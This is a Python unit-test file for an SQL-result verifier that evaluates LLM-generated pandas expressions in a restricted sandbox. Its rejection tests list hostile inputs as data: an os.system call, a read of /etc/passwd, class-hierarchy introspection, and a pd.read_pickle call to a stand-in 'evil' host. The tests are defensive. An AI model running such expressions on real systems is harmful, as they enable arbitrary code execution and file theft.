"""DPC dual-paradigm SQL verification — Tier A unit tests (LLM/tools faked)."""
import os
import sys

import numpy as np
import pandas as pd
import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from agents.dpc_verifier import VerificationResult, results_agree


def test_verification_result_defaults():
    vr = VerificationResult(status="skipped", verified=None, reason="multi-table")
    assert vr.status == "skipped"
    assert vr.verified is None
    assert vr.method == "dual_paradigm_pandas"
    assert vr.pandas_expr is None


def test_results_agree_scalar_match():
    # SQL returned one cell = 6; pandas computed scalar 6 → agree.
    assert results_agree(["s"], [[6]], 6) is True


def test_results_agree_scalar_mismatch():
    assert results_agree(["s"], [[5]], 6) is False


def test_results_agree_within_tolerance():
    assert results_agree(["s"], [[1.0000001]], 1.0, tol=1e-6) is True


def test_results_agree_order_insensitive():
    # Row order differs between SQL and pandas — still the same value set.
    pandas_side = pd.DataFrame({"g": ["b", "a"], "v": [3, 1]})
    assert results_agree(["g", "v"], [["a", 1], ["b", 3]], pandas_side) is True


def test_results_agree_series_and_none():
    s = pd.Series([10, 20])
    assert results_agree(["c"], [[10], [20]], s) is True
    assert results_agree(["c"], [[None]], pd.Series([np.nan])) is True


from agents.dpc_verifier import extract_single_table


def test_extract_single_table_simple():
    assert extract_single_table('SELECT * FROM "sales"') == "sales"


def test_extract_single_table_join_returns_none():
    sql = 'SELECT a.x FROM "t1" a JOIN "t2" b ON a.id = b.id'
    assert extract_single_table(sql) is None


def test_extract_single_table_cte_excludes_alias():
    # CTE alias `c` is not a base table — the lone base table is `orders`.
    sql = 'WITH c AS (SELECT * FROM "orders") SELECT count(*) FROM c'
    assert extract_single_table(sql) == "orders"


def test_extract_single_table_no_table():
    assert extract_single_table("SELECT 1") is None


def test_extract_single_table_unparseable():
    assert extract_single_table("this is not sql ;;;") is None


import time as _time

from agents.dpc_verifier import _run_with_timeout, safe_eval_pandas


def _df():
    return pd.DataFrame({"g": ["a", "a", "b"], "v": [1, 2, 3], "cost": [10, 20, 30]})


def test_safe_eval_pandas_correct():
    assert safe_eval_pandas('df["v"].sum()', _df()) == 6


def test_safe_eval_pandas_allows_columns_containing_denied_substrings():
    # "cost" contains "os" — must NOT be rejected (word-boundary denylist).
    assert safe_eval_pandas('df["cost"].sum()', _df()) == 60


@pytest.mark.parametrize("expr", [
    '__import__("os").system("echo hi")',
    "import os",
    'open("/etc/passwd").read()',
    "df.__class__.__mro__",
    "globals()",
    "os.getcwd()",
])
def test_safe_eval_pandas_rejects_dangerous(expr):
    with pytest.raises(ValueError):
        safe_eval_pandas(expr, _df())


def test_run_with_timeout_raises():
    with pytest.raises(TimeoutError):
        _run_with_timeout(lambda: _time.sleep(2.0), 0.2)


@pytest.mark.parametrize("expr", [
    'pd.read_pickle("http://evil/x")',   # module RCE sink — pd must be out of scope
    'pd.read_sql("SELECT 1", con)',      # module DB sink
    'df.to_pickle("x")',                 # DataFrame I/O sink (write)
    'df.to_csv("x")',
    'df.to_sql("t", con)',
    'df.query("v > 0")',                 # secondary eval engine
    'np.zeros(3)',                       # np must be out of scope
    "[x for x in df]",                   # comprehension binds a new name
])
def test_safe_eval_pandas_blocks_io_sinks_and_modules(expr):
    # These are rejected statically (AST allowlist) BEFORE any eval, so the
    # sink never executes. The old regex denylist let pd.read_pickle through.
    with pytest.raises(ValueError):
        safe_eval_pandas(expr, _df())


def test_safe_eval_pandas_allows_safe_builtins_and_groupby():
    assert safe_eval_pandas('len(df[df["v"] > 1])', _df()) == 2
    out = safe_eval_pandas('df.groupby("g")["v"].sum()', _df())
    assert int(out.loc["a"]) == 3 and int(out.loc["b"]) == 3


import asyncio

from agents.dpc_verifier import (
    extract_columns_rows,
    generate_pandas_solution,
    materialize_table,
)
from agents.tool_registry import Tool, ToolRegistry


def _tools(result):
    reg = ToolRegistry()

    async def _exec(*, query, connection_id="default"):
        return result

    reg.register(Tool(name="execute_sql", description="x", category="sql", fn=_exec))
    return reg


class _FixedLLM:
    def __init__(self, text):
        self._text = text

    def is_available(self):
        return True

    def generate(self, prompt, **kw):
        return self._text


def test_extract_columns_rows_from_dict():
    cols, rows = extract_columns_rows({"columns": ["a"], "rows": [[1]]})
    assert cols == ["a"] and rows == [[1]]


def test_materialize_table_builds_dataframe():
    tbl = {"columns": ["g", "v"], "rows": [["a", 1], ["b", 2]]}
    df = asyncio.run(materialize_table("t", _tools(tbl), max_rows=1000))
    assert list(df.columns) == ["g", "v"]
    assert df["v"].sum() == 3


def test_materialize_table_too_large_returns_none():
    tbl = {"columns": ["v"], "rows": [[1], [2], [3]]}
    assert asyncio.run(materialize_table("t", _tools(tbl), max_rows=2)) is None


def test_generate_pandas_solution_strips_fence():
    df = pd.DataFrame({"v": [1, 2]})
    expr = generate_pandas_solution("total v", df, _FixedLLM('```python\ndf["v"].sum()\n```'))
    assert expr == 'df["v"].sum()'


def test_generate_pandas_solution_raises_when_unavailable():
    class _Down(_FixedLLM):
        def is_available(self):
            return False

    with pytest.raises(RuntimeError):
        generate_pandas_solution("q", pd.DataFrame({"v": [1]}), _Down(""))
